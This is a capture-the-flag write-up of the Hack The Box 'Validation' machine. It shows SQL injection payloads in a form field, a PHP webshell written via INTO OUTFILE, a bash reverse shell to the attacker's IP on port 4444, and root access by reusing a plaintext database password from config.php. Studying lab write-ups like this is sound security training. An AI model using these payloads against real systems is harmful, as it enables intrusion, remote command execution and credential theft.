# Validation - Linux, easy (10.10.11.116)

### Enumeration:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
```

The website provides us a form in which we can specificy a username and a dropdown box to select the country.
After registering the user we are redirected to page **/account.php** in which the names of users in the country specified are listed.

Using Burp, we can inspect the requests.
We can notice that the country field (that is in a dropdown box, which means that we cannot write in it from the website our content), appears in plaintext so we can modify it.
Moreover, the page will send us a cookie called "user" when redirecting us to /account.php.
Note that the cookie will be always the same if we do not change the username!

By changing the country field in request in the folliwing way: `username=ciao&country=' OR 1=1 -- -`, we can notice that the website provides the names of all the users, even the ones from other countries.
This means that the website is *vulnerable to SQLI*!
We can guess that the SQL query on the page looks like `SELECT username from players where country = '[input]';`.

Note that if we do not append `-- -` in the country, we will receive the following error `Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33`.

To test this vulnerability in a easier way we can open two Repeater tabs in Burp, one with the POST request where we can modify username and country, and one with the GET request to /account.php where we can inspect the result.

### SQLi UNION attack
When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack.
The UNION operator is used to combine the result-set of two or more SELECT statements:
1. Every SELECT statement within UNION must have the same number of columns
2. The columns must also have similar data types
3. The columns in every SELECT statement must also be in the same order

Trying `country=' Union Select 1 -- -` we do not see erros but the query returns value 1.

### Enumerating the DB
If we change 1 to user(), we can see the following name: `uhc@localhost`.
We can also enumerate the name of current database with function **database()**, and the name is `registration`.

With `username=123&country=' union select schema_name from information_schema.schemata -- -` we can obtain the names of all the DBs:
```
information_schema
performance_schema
mysql
registration
```

and the most interesting is `registration`, since the others are mysql and internals.

There is a single table in DB registration:
```
username=1232&country=' union select table_name from information_schema.tables where table_schema = 'registration' -- -
registration
```

It has four columns:
```
username=1232&country=' union select column_name from information_schema.columns where table_name = 'registration' -- -
  1. username
  2. userhash
  3. country
  4. regtime
```

Unfortunately, there's no password here!

### Getting a webshell
We can try to write a file by setting the following values: `username=csbbbbb&country=' union select "Hello I'm here" into outfile '/var/www/html/test.txt' -- -`.
Now, visiting 10.10.11.116/test.txt we should see the string!

At this point, we can try to write a simple php webshell: `username=asdadadadadad&country=' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
'/var/www/html/shell.php'-- -`.

And it works!
```
kali@kali:~/HackTheBox/retired/Linux/easy/Validation$ curl http://10.10.11.116/shell.php?cmd= "
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

To get a reverse shell just make a POST request with Burp, in the Repeater modifying the GET request that you can intercept when you visit http://10.10.11.116/shell.php, and add at the bottom the **cmd** parameter with the reverse shell URL encoded:
```
POST /shell.php HTTP/1.1
Host: 10.10.11.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: user=ff362afb00fa83da92fd95b38424a556
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/4444+0>%261'
```

### From www-data to Root
We cant `cat config.php` to reveal the DB credentials and notice that the password has "global-pw" in it. This may be an hint which means that the password may be used also somewhere else.
```
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";
```

Let's try `su -` with the password that we have seen to get a shell as root!

